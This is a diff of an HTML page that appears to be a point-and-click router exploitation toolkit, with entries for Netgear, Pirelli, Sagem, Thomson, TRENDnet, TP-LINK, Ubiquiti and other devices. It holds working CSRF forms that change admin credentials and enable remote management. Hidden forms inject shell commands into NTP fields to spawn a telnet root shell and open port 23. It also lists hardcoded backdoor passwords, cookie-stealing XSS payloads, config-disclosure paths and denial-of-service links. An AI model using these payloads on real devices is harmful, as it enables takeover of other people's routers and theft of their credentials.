+	<div><a href="javascript:setip('/cgi-bin/welcome/VPN_only?../../../../../')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>01/24/05</div>
 	<div><a href="http://securityvulns.com/Hdocument664.html">[+]</a></div>
 	<div><a href="javascript:netcon()">FVS318 content filtering bypass</a></div>
-	<div><a href="javascript:netcon()">[IP]</a></div>
+	<div><a href="javascript:netcon()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>01/24/05</div>
 	<div><a href="http://securityvulns.com/Hdocument664.html">[+]</a></div>
 	<div><a href="javascript:netlog()">FVS318 log file arbitrary content injection</a></div>
-	<div><a href="javascript:netlog()">[IP]</a></div>
+	<div><a href="javascript:netlog()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/12/04</div>
 	<div><a href="http://archives.neohapsis.com/archives/bugtraq/2004-08/0181.html">[+]</a></div>
 	<div><a href="http://192.168.0.1/setup.cgi?todo=debug">DG834G enable telnet root shell</a></div>
-	<div><a href="javascript:setip('/setup.cgi?todo=debug')">[IP]</a></div>
+	<div><a href="javascript:setip('/setup.cgi?todo=debug')">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/12/04</div>
 	<div><a href="http://www.derkeiler.com/Mailing-Lists/Full-Disclosure/2004-06/0176.html">[+]</a></div>
 	<div><a href="javascript:netundb()">WG602 undocumented admin account (superman)</a></div>
-	<div><a href="javascript:netundb()">[IP]</a></div>
+	<div><a href="javascript:netundb()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>08/12/04</div>
 	<div><a href="http://archives.neohapsis.com/archives/fulldisclosure/2004-06/0049.html">[+]</a></div>
 	<div><a href="javascript:netund()">WG602 undocumented admin account (super)</a></div>
-	<div><a href="javascript:netund()">[IP]</a></div>
+	<div><a href="javascript:netund()">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="pirelli">
 <h2>Pirelli</h2>
-<h3><a href="javascript:img('PRG EAV4202N')">PRG EAV4202N</a>, <a href="javascript:img('PRGAV4202N')">PRGAV4202N</a>, <a href="javascript:img('PRG 4202 N')">PRG 4202 N</a>, <a href="javascript:img('P.RG AV4202N')">P.RG AV4202N</a>, <a href="javascript:img('DRG A225')">DRG A225</a></h3>
+<h3><a href="javascript:img('DRG A125g')">DRG A125g</a>, <a href="javascript:img('PRG EAV4202N')">PRG EAV4202N</a>, <a href="javascript:img('PRGAV4202N')">PRGAV4202N</a>, <a href="javascript:img('PRG 4202 N')">PRG 4202 N</a>, <a href="javascript:img('P.RG AV4202N')">P.RG AV4202N</a>, <a href="javascript:img('DRG A225')">DRG A225</a></h3>
+
+<article>
+	<div>25/11/13</div>
+	<div><a href="http://packetstormsecurity.com/files/124165">[+]</a></div>
+	<div><a href="http://10.0.0.2/wlbasic.html">Discus ADSL DRG A125g Wifi password disclosure</a></div>
+	<div><a href="javascript:setip('/wlbasic.html')">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>12/04/11</div>
@@ -2433,13 +2978,27 @@ function GenArrisPasswords(startdate, enddate) {
 </section><br><br><section id="sagem">
 <h2>Sagem</h2>
 <form method="POST" name="sagem2604" action="http://192.168.1.254/password.cgi"></form>
-<h3><a href="javascript:img('F@ST 2604')">F@ST 2604</a>, <a href="javascript:img('Fast 3304-V1')">Fast 3304-V1</a>, <a href="javascript:img('3304-V2')">3304-V2</a>, <a href="javascript:img('3464')">3464</a>, <a href="javascript:img('3504')">3504</a></h3>
+<form method="POST" name="f1500WG" action="http://192.168.1.2/m_atminttemp11.stm">
+<h3><a href="javascript:img('F@ST 2604')">F@ST 2604</a>, <a href="javascript:img('F@ST 3184')">F@ST 3184</a>, <a href="javascript:img('Fast 3304-V1')">Fast 3304-V1</a>, <a href="javascript:img('3304-V2')">3304-V2</a>, <a href="javascript:img('3464')">3464</a>, <a href="javascript:img('3504')">3504</a></h3>
+
+<article>
+	<div>11/28/13</div>
+	<div><a href="http://1337day.com/exploit/18213">[+]</a></div>
+	<div><a href="javascript:document.f1500WG.submit()">Sagem F@st 1500WG  PPPoE Data Disclosure (ADSL Router)</a></div>
+	<div><a href="javascript:ff1500WG();">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>12/16/12</div>
+	<div><a href="https://ptsec.eu/wp/sagemcom-fst-3184-default-wireless-password-cabovisao/">[+]</a></div>
+	<div><a href="javascript:sagemcable();">Sagemcom f@st 3184 default wireless password [Cabovisão]</a></div>
+</article>
 
 <article>
 	<div>02/21/12</div>
 	<div><a href="http://1337day.com/exploits/17553">[+]</a></div>
 	<div><a href="javascript:sagem2604()">Sagem F@ST 2604 CSRF Change Admin Password</a></div>
-	<div><a href="javascript:sagem2604r()">[IP]</a></div>
+	<div><a href="javascript:sagem2604r()">[SET IP]</a></div>
 </article>
 
 <article>
@@ -2456,7 +3015,7 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>05/23/12</div>
 	<div><a href="http://www.kb.cert.org/vuls/id/515283">[+]</a></div>
 	<div><a href="javascript:setip('/d41d8cd98f00b204e9800998ecf8427e.php')">BlackArmor NAS Password Reset</a></div>
-	<div><a href="javascript:setip('/d41d8cd98f00b204e9800998ecf8427e.php')">[IP]</a></div>
+	<div><a href="javascript:setip('/d41d8cd98f00b204e9800998ecf8427e.php')">[SET IP]</a></div>
 </article>
 
 <div style="float: right"><a href="#">^ Top</a></div>
@@ -2468,67 +3027,76 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>03/30/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
 	<div><a href="javascript:isnaaa()">FlexiISN auth bypass AAA Configuration</a></div>
-	<div><a href="javascript:isnaaa()">[IP]</a></div>
+	<div><a href="javascript:isnaaa()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>03/30/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
 	<div><a href="javascript:isnagr()">FlexiISN auth bypass Aggregation Class Configuration</a></div>
-	<div><a href="javascript:isnagr()">[IP]</a></div>
+	<div><a href="javascript:isnagr()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>03/30/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
 	<div><a href="javascript:isnggs()">FlexiISN auth bypass GGSN general Configuration</a></div>
-	<div><a href="javascript:isnggs()">[IP]</a></div>
+	<div><a href="javascript:isnggs()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>03/30/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
 	<div><a href="javascript:isnser()">FlexiISN auth bypass Network Access & services</a></div>
-	<div><a href="javascript:isnser()">[IP]</a></div>
+	<div><a href="javascript:isnser()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>06/16/08</div>
 	<div></div>
 	<div><a href="http://telmex:telmex@192.168.1.254/">5200 Default administrator account</a></div>
-	<div><a href="javascript:ssDefaultPass()">[IP]</a></div>
+	<div><a href="javascript:ssDefaultPass()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/16/08</div>
 	<div><a href="http://hakim.ws/textos/ss5200-authbypass.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254./">5200 Host authentication bypass</a></div>
-	<div><a href="javascript:setip('./')">[IP]</a></div>
+	<div><a href="javascript:setip('./')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/16/08</div>
 	<div><a href="http://hakim.ws/textos/ss5200-authbypass.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254./.cfg">5200 Configuration disclosure /.cfg</a></div>
-	<div><a href="javascript:setip('./.cfg')">[IP]</a></div>
+	<div><a href="javascript:setip('./.cfg')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/02/08</div>
 	<div><a href="http://helith.net/txt/siemens_gigaset_se461_wimax_router_remote_dos.txt">[+]</a></div>
 	<div><a href="http://192.168.1.1:53">SE461 denial of service</a></div>
-	<div><a href="javascript:setip(':53')">[IP]</a></div>
+	<div><a href="javascript:setip(':53')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="sitecom">
 <h2>Sitecom</h2>
 <h3><a href="javascript:img('Sitecom DC-227')">Sitecom DC-227</a></h3>
-
 <article>
 	<div>12/19/11</div>
 	<div><a href="http://it.answers.yahoo.com/question/index?qid=20111219131253AAfPJHp">[+]</a></div>
 	<div><a href="http://adsl:epicrouter2007@10.0.0.1/">Sitecom DC-227 Backdoor account</a></div>
-	<div><a href="javascript:dc227backdoor()">[IP]</a></div>
+	<div><a href="javascript:dc227backdoor()">[SET IP]</a></div>
+</article>
+<div style="float: right"><a href="#">^ Top</a></div>
+</section><br><br><section id="smc">
+<h2>SMC</h2>
+<h3><a href="javascript:img('SMCWBR14-G2')">SMCWBR14-G2</a></h3>
+<article>
+	<div>11/28/13</div>
+	<div><a href="http://1337day.com/exploit/18282">[+]</a></div>
+	<div><a href="http://192.168.1.1/wan.stm">SMCWBR14-G2 PPPoE Data Disclosure (ADSL Router)</a></div>
+	<div><a href="javascript:setip('/wan.stm');">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="thomson">
@@ -2567,81 +3135,187 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>04/02/11</div>
 	<div><a href=alert("Edgard_Chammas")>[+]</a></div>
 	<div><a href="http://192.168.1.254/cgi/b/ic/connect/?url=<script>alert(1)</script>">ST585 Cross site scripting</a></div>
-	<div><a href="javascript:setip('/cgi/b/ic/connect/?url=<script>alert(1)</script>')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi/b/ic/connect/?url=<script>alert(1)</script>')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>12/09/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/10362">[+]</a></div>
 	<div><a href="http://192.168.1.254./cgi/b/backup/user.ini">ST585, TG585n user.ini arbitrary download vulnerability</a></div>
-	<div><a href="javascript:setip('./cgi/b/backup/user.ini')">[IP]</a></div>
+	<div><a href="javascript:setip('./cgi/b/backup/user.ini')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/10/08</div>
 	<div><a href="http://hakim.ws/textos/st585-csrf.txt">[+]</a></div>
 	<div><a href="javascript:thomsondom()">ST585 Redirect domain CSRF</a></div>
-	<div><a href="javascript:thomsondomr()">[IP]</a></div>
+	<div><a href="javascript:thomsondomr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/10/08</div>
 	<div><a href="http://hakim.ws/textos/st585-csrf.txt">[+]</a></div>
 	<div><a href="javascript:thomsonadmin()">ST585 Add administrator account CSRF</a></div>
-	<div><a href="javascript:thomsonadminr()">[IP]</a></div>
+	<div><a href="javascript:thomsonadminr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/14/08</div>
 	<div><a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-1/">[+]</a></div>
 	<div><a href="javascript:thomsoncall()">bthomehub call number (voice-jacking) auth bypass</a></div>
-	<div><a href="javascript:thomsoncallr()">[IP]</a></div>
+	<div><a href="javascript:thomsoncallr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/08/07</div>
 	<div><a href="http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/">[+]</a></div>
 	<div><a href="http://bthomehub/cgi/b/secpol/cfg//">bthomehub authentication bypass</a></div>
-	<div><a href="javascript:setip('/cgi/b/secpol/cfg//')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi/b/secpol/cfg//')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/08/07</div>
 	<div><a href="http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/">[+]</a></div>
 	<div><a href="javascript:btra()">bthomehub enable remote access and change tech password</a></div>
-	<div><a href="javascript:btrar()">[IP]</a></div>
+	<div><a href="javascript:btrar()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/08/07</div>
 	<div><a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-1/">[+]</a></div>
 	<div><a href="javascript:document.btwifi.submit()">bthomehub disable wifi</a></div>
-	<div><a href="javascript:btwifir()">[IP]</a></div>
+	<div><a href="javascript:btwifir()">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
+<form name="t231" action="http://192.168.10.1/uapply.cgi" method="post" target="a">
+<input type="hidden" name="page" value="/advanced/single_port.asp">
+<input type="hidden" name="forward_port_enable" value="0">
+<input type="hidden" name="forward_port" value="24">
+<input type="hidden" name="forward_port_proto0" value="tcp">
+<input type="hidden" name="forward_port_from_start0" value="23">
+<input type="hidden" name="forward_port_from_end0" value="23">
+<input type="hidden" name="forward_port_to_ip0" value="192.168.10.1">
+<input type="hidden" name="forward_port_to_start0" value="23">
+<input type="hidden" name="forward_port_to_end0" value="23">
+<input type="hidden" name="schedule0" value="0">
+<input type="hidden" name="forward_port_enable0" value="on">
+<input type="hidden" name="action" value="Apply">
+</form>
+<form name="t232" action="http://192.168.10.1/setNTP.cgi" method="post" target="a">
+<input type="hidden" name="page" value="/adm/time.asp">
+<input type="hidden" name="DSTenable" value="on">
+<input type="hidden" name="NtpDstEnable" value="1">
+<input type="hidden" name="NtpDstOffset" value="`utelnetd -l /bin/sh`">
+<input type="hidden" name="NtpDstStart" value="030102">
+<input type="hidden" name="tz_daylight_start_month_select" value="03">
+<input type="hidden" name="tz_daylight_start_day_select" value="01">
+<input type="hidden" name="tz_daylight_start_time_select" value="02">
+<input type="hidden" name="NtpDstEnd" value="100102">
+<input type="hidden" name="tz_daylight_end_month_select" value="10">
+<input type="hidden" name="tz_daylight_end_day_select" value="01">
+<input type="hidden" name="tz_daylight_end_time_select" value="02">
+<input type="hidden" name="ntp_server" value="1">
+<input type="hidden" name="NTPServerIP" value="pool.ntp.org">
+<input type="hidden" name="time_zone" value="UCT_11">
+<input type="hidden" name="timer_interval" value="300">
+<input type="hidden" name="manual_year_select" value="2012">
+<input type="hidden" name="manual_month_select" value="01">
+<input type="hidden" name="manual_day_select" value="01">
+<input type="hidden" name="manual_hour_select" value="00">
+<input type="hidden" name="manual_min_select" value="19">
+<input type="hidden" name="manual_sec_select" value="57">
+<input type="hidden" name="timeTag" value="manual">
+</form>
+<form name="t233" action="http://192.168.10.1/setNTP.cgi" method="post" target="a">
+<input type="hidden" name="page" value="/adm/time.asp">
+<input type="hidden" name="DSTenable" value="on">
+<input type="hidden" name="NtpDstEnable" value="1">
+<input type="hidden" name="NtpDstOffset" value="3600">
+<input type="hidden" name="NtpDstStart" value="030102">
+<input type="hidden" name="tz_daylight_start_month_select" value="03">
+<input type="hidden" name="tz_daylight_start_day_select" value="01">
+<input type="hidden" name="tz_daylight_start_time_select" value="02">
+<input type="hidden" name="NtpDstEnd" value="`count=0;while [ $countle 25 ]; do iptables -I INPUT 1 -p tcp --dport 23 -j ACCEPT;(( count++ ));done;`">
+<input type="hidden" name="tz_daylight_end_month_select" value="10">
+<input type="hidden" name="tz_daylight_end_day_select" value="01">
+<input type="hidden" name="tz_daylight_end_time_select" value="02">
+<input type="hidden" name="ntp_server" value="1">
+<input type="hidden" name="NTPServerIP" value="pool.ntp.org">
+<input type="hidden" name="time_zone" value="UCT_11">
+<input type="hidden" name="timer_interval" value="300">
+<input type="hidden" name="manual_year_select" value="2012">
+<input type="hidden" name="manual_month_select" value="01">
+<input type="hidden" name="manual_day_select" value="01">
+<input type="hidden" name="manual_hour_select" value="00">
+<input type="hidden" name="manual_min_select" value="19">
+<input type="hidden" name="manual_sec_select" value="57">
+<input type="hidden" name="timeTag" value="manual">
+</form>
+<iframe name="a" style="display:none"></iframe>
 </section><br><br><section id="trendnet">
+<form name="trendCSRF" action="http://192.168.10.1/setSysAdm.cgi" method="post"/>
+<input type="hidden" name="page" value="/adm/management.asp"/>
+<input type="hidden" name="admuser" value="admin"/>
+<inputtype="hidden" name="admpass" value="password"/>
+<input type="hidden" name="AuthTimeout" value="600"/>
+</form>
+<form name="trendCSRF2" action="http://192.168.10.1/uapply.cgi" method="post"/>
+<input type="hidden" name="page" value="/adm/management.asp"/>
+<input type="hidden" name="remote_en" value="1"/>
+<input type="hidden" name="http_wanport" value="31337"/>
+<input type="hidden" name="action" value="Apply"/>
+<input type="hidden" name="apply_do" value="setRemoteManagement"/>
+</form>
 <h2>TRENDnet</h2>
-<h3><a href="javascript:img('TEW-633GR')">TEW-633GR</a>, <a href="javascript:img('Trendnet TV-IP')">TV-IP</a></h3>
+<h3><a href="javascript:img('TEW-691GR')">TEW-691GR</a>, <a href="javascript:img('TEW-692GR')">TEW-692GR</a>, <a href="javascript:img('TEW-633GR')">TEW-633GR</a>, <a href="javascript:img('TEW-812DRU')">TEW-812DRU</a>, <a href="javascript:img('Trendnet TV-IP')">TV-IP</a></h3>
+
+<article>
+	<div>08/13/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="http://192.168.10.1/backdoor?password=j78G-DFdg_24Mhw3">TEW 812DRU TEW-692GR TEW-691GR Enable Telnet Backdoor </a></div>
+	<div><a href="javascript:setip('/backdoor?password=j78G-DFdg_24Mhw3')">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>08/13/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:trend23pwn()">TEW 812DRU CSRF Enable remote telnet</a></div>
+	<div><a href="javascript:trend23pwn()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>08/13/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:document.trendCSRF.submit()">TEW 812DRU CSRF Change Admin Credentials</a></div>
+	<div><a href="javascript:trendCSRF()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>08/13/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:document.trendCSRF2.submit()">TEW 812DRU CSRF Enable Remote Management</a></div>
+	<div><a href="javascript:trendCSRF2()">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>01/10/12</div>
 	<div><a href="http://console-cowboys.blogspot.com.au/2012/01/trendnet-cameras-i-always-feel-like.html">[+]</a></div>
 	<div><a href="http://192.168.10.30/anony/mjpg.cgi">TV-IP Cameras authentication bypass</a></div>
-	<div><a href="javascript:setip('/anony/mjpg.cgi')">[IP]</a></div>
+	<div><a href="javascript:setip('/anony/mjpg.cgi')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/26/08</div>
 	<div><a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">[+]</a></div>
 	<div><a href="http://192.168.10.1/Basic/Wireless.shtml">TEW-633GR A-to-C authentication bypass</a></div>
-	<div><a href="javascript:setip('/Basic/Wireless.shtml')">[IP]</a></div>
+	<div><a href="javascript:setip('/Basic/Wireless.shtml')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/26/08</div>
 	<div><a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">[+]</a></div>
 	<div><a href="http://192.168.10.1/reboot.cgi?reset=true">TEW-633GR unauthorized factory reset</a></div>
-	<div><a href="javascript:setip('/reboot.cgi?reset=true')">[IP]</a></div>
+	<div><a href="javascript:setip('/reboot.cgi?reset=true')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="ubiquiti">
@@ -2652,20 +3326,20 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>01/06/13</div>
 	<div><a href="javascript:alert('moloch')">[+]</a></div>
 	<div><a href="javascript:urlxss('http://192.168.1.1/login.cgi?uri=URLXSS')">AirOS login page cross site scripting</a></div>
-	<div><a href="javascript:setip('/login.cgi?uri=a%22%3E%3Cscript%3Ealert(%22xss%22)%3C%2Fscript%3E%3Ch2%2520%22')">[IP]</a></div>
+	<div><a href="javascript:setip('/login.cgi?uri=a%22%3E%3Cscript%3Ealert(%22xss%22)%3C%2Fscript%3E%3Ch2%2520%22')">[SET IP]</a></div>
 </article>
 <article>
 	<div>12/19/11</div>
 	<div><a href="http://forum.ubnt.com/showthread.php?t=45169">[+]</a></div>
 	<div><a href="http://192.168.1.1/admin.cgi/sd.css">AirOS v3.6.1 v4.0 v5.x command execution</a></div>
-	<div><a href="javascript:setip('/admin.cgi/sd.css')">[IP]</a></div>
+	<div><a href="javascript:setip('/admin.cgi/sd.css')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/30/10</div>
 	<div><a href="http://www.securityfocus.com/bid/41272/info">[+]</a></div>
 	<div><a href="javascript:airoscmd()">AirOS command execution</a></div>
-	<div><a href="javascript:airoscmdr()">[IP]</a></div>
+	<div><a href="javascript:airoscmdr()">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="utstarcom">
@@ -2676,7 +3350,7 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>09/03/08</div>
 	<div><a href="http://www.indiabroadband.net/bsnl-broadband/9002-isp-login-failed.html">[+]</a></div>
 	<div><a href="http://192.168.1.1/ppppassword.html">DNA-A-211, UT300R2U information disclosure</a></div>
-	<div><a href="javascript:setip('/ppppassword.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/ppppassword.html')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="xavi">
@@ -2687,41 +3361,64 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>01/02/12</div>
 	<div><a href="javascript:alert('Busindre')">[+]</a></div>
 	<div><a href="http://192.168.1.1/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&confirm=+Apply+">X7968 cross site scripting</a></div>
-	<div><a href="javascript:setip('/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&confirm=+Apply+')">[IP]</a></div>
+	<div><a href="javascript:setip('/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&confirm=+Apply+')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/02/12</div>
 	<div><a href="javascript:alert('Busindre')">[+]</a></div>
 	<div><a href="http://192.168.1.1/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=192.168.1.1&sub_mask_txtbox=255.255.255.0&host_name_txtbox=Hack<SCRIPT>alert(document.cookie)</script>&domain_name_txtbox=local.lan&mtu_txtbox=1500&next=Apply">X7968 persistent cross site scripting</a></div>
-	<div><a href="javascript:setip('/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=192.168.1.1&sub_mask_txtbox=255.255.255.0&host_name_txtbox=Hack<SCRIPT>alert(document.cookie)</script>&domain_name_txtbox=local.lan&mtu_txtbox=1500&next=Apply')">[IP]</a></div>
+	<div><a href="javascript:setip('/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=192.168.1.1&sub_mask_txtbox=255.255.255.0&host_name_txtbox=Hack<SCRIPT>alert(document.cookie)</script>&domain_name_txtbox=local.lan&mtu_txtbox=1500&next=Apply')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/02/12</div>
 	<div><a href="javascript:alert('Busindre')">[+]</a></div>
 	<div><a href="javascript:xavi()">X7968 open port for ip CSRF</a></div>
-	<div><a href="javascript:xavir()">[IP]</a></div>
+	<div><a href="javascript:xavir()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/02/12</div>
 	<div><a href="javascript:alert('Busindre')">[+]</a></div>
 	<div><a href="http://192.168.1.1/webconfig/ports/ports.html">X7968 denial of service</a></div>
-	<div><a href="javascript:setip('/webconfig/ports/ports.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/webconfig/ports/ports.html')">[SET IP]</a></div>
 </article>
 
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="tplink">
+<form name="WR1043ND" action="http://192.168.1.1/Forms/tools_admin_1" method="post">
+<input name="uiViewTools_Password" value="123123" type="hidden">
+<input name="uiViewTools_PasswordConfirm" value="123123" type="hidden"></form>
 <h2>TP-LINK</h2>
-<h3><a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WR743ND')">WR743ND</a>, <a href="javascript:img('WR842ND')">WR842ND</a>, <a href="javascript:img('WA-901ND')">WA-901ND</a>, <a href="javascript:img('WR941N')">WR941N</a>, <a href="javascript:img('WR941ND')">WR941ND</a>, <a href="javascript:img('WR1043ND')">WR1043ND</a>, <a href="javascript:img('WR2543ND')">WR2543ND</a>, <a href="javascript:img('MR3220')">MR3220</a>, <a href="javascript:img('MR3020')">MR3020</a>, <a href="javascript:img('WR841N ')">WR841N</a></h3>
+<h3><a href="javascript:img('TD-8817')">TD-8817</a>, <a href="javascript:img('TD-W8901G')">TD-W8901G</a>, <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WR743ND')">WR743ND</a>, <a href="javascript:img('WR842ND')">WR842ND</a>, <a href="javascript:img('WA-901ND')">WA-901ND</a>, <a href="javascript:img('WR941N')">WR941N</a>, <a href="javascript:img('WR941ND')">WR941ND</a>, <a href="javascript:img('WR1043ND')">WR1043ND</a>, <a href="javascript:img('WR2543ND')">WR2543ND</a>, <a href="javascript:img('MR3220')">MR3220</a>, <a href="javascript:img('MR3020')">MR3020</a>, <a href="javascript:img('WR841N ')">WR841N</a></h3>
+
+<article>
+	<div>08/06/13</div>
+	<div><a href=http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf>[+]</a></div>
+	<div><a href="javascript:document.WR1043ND.submit();">WR1043ND denial of service</a></div>
+	<div><a href="javascript:setip('/...')">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>08/06/13</div>
+	<div><a href=http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf>[+]</a></div>
+	<div><a href="javascript:WR1043ND()">WR1043ND enable root filsystem on FTP CSRF</a></div>
+	<div><a href="javascript:WR1043ND(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/06/13</div>
+	<div><a href=http://www.youtube.com/watch?v=8xJGkRQB0QM>[+]</a></div>
+	<div><a href="http://192.168.1.1/Forms/tools_admin_1">TD-8817 TD-W8901G blank admin password CSRF</a></div>
+	<div><a href="javascript:setip('/Forms/tools_admin_1');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>05/26/12</div>
 	<div><a href=http://www.websec.mx/advisories/view/puerta-trasera-tplink-wdr740>[+]</a></div>
 	<div><a href="http://192.168.0.1/userRpmNatDebugRpm26525557/linux_cmdline.html">Webshell backdoor (user: osteam password: 5up)</a></div>
-	<div><a href="javascript:setip('/userRpmNatDebugRpm26525557/linux_cmdline.html');">[IP]</a></div>
-	<div></div>
+	<div><a href="javascript:setip('/userRpmNatDebugRpm26525557/linux_cmdline.html');">[SET IP]</a></div>
 </article>
 
 <div style="float: right"><a href="#">^ Top</a></div>
@@ -2736,63 +3433,74 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>05/04/11</div>
 	<div><a href="http://int21.de/cve/CVE-2011-0746-o2-router.html">[+]</a></div>
 	<div><a href="javascript:zyxelxssp()">O2 Classic persistent cross site scripting</a></div>
-	<div><a href="javascript:zyxelxsspr()">[IP]</a></div>
+	<div><a href="javascript:zyxelxsspr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/04/11</div>
 	<div><a href="http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-004/-client-side-authorization-zyxel-zywall-usg-appliances-web-interface">[+]</a></div>
 	<div><a href="https://192.168.0.1/cgi-bin/export-cgi?category=config&arg0=startup-config.conf">ZyWALL USG client side authorization config disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/export-cgi?category=config&arg0=startup-config.conf')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/export-cgi?category=config&arg0=startup-config.conf')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/18/09</div>
 	<div><a href="http://mfs-enterprise.com/security/site/en/advisory/Security_Advisory_ZyXEL.pdf">[+]</a></div>
